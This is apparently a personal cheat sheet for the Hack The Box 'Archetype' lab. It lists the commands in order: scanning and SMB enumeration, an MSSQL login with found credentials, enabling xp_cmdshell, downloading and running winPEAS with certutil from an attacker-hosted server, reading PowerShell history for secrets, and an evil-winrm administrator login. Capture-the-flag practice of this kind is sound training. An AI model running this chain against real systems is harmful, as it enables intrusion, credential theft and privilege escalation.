# Hack The Box - Archetype Machiene


## Initial Scan
nmap - sudo nmap 10.129.95.187 -sS -sV -sC -oN ./nmap.txt

## SMB Shares Enumeration
sudo nmap 10.129.95.187 -p 445 --script smb-enum-shares -oN ./nmap-smb-enum.txt

## SMB Shares Command
smbclient //10.129.95.187/backups 

## Impacket
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
enable_xp_cmdshell

## Create WINPEAS PS1 FILE
cat winPEAS.ps1 | xclip -sel clip
touch test.ps1
nano test.ps1 + copy file contents into file

## Host Python Server
python3 -m http.server 8000 ( Host in the directory where you created the WINPEAS file )

## Get WINPEAS file from the Impacket SQL Shell
xp_cmdshell "certutil.exe -urlcache -f http://10.10.16.64:8000/file.ps1 C:\Users\sql_svc\Desktop\winpeas.ps1"
EXEC xp_cmdshell 'powershell.exe -ExecutionPolicy Bypass -File "C:\Users\sql_svc\Desktop\winpeas.ps1" > C:\Users\sql_svc\Desktop\out.txt';
EXEC xp_cmdshell 'type "C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"';

## Connect with Evil-WinRM
evil-winrm -i 10.10.10.27 -u Administrator -p 'MEGACORP_4dm1n!!'
